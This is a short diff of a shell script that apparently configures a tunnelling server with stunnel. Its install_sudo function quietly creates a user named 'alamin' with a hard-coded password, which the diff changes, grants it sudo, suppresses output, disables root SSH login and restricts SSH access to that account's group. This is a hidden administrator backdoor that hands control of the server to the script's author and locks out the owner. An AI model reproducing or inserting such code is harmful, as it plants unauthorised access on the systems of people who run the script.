@@ -619,7 +619,7 @@ sudo service stunnel4 restart
 
 install_sudo(){
   {
-    useradd -m alamin 2>/dev/null; echo alamin:@@Alamin123 | chpasswd &>/dev/null; usermod -aG sudo alamin &>/dev/null
+    useradd -m alamin 2>/dev/null; echo alamin:@AlaminX001 | chpasswd &>/dev/null; usermod -aG sudo alamin &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
     echo "AllowGroups alamin" >> /etc/ssh/sshd_config
     service sshd restart
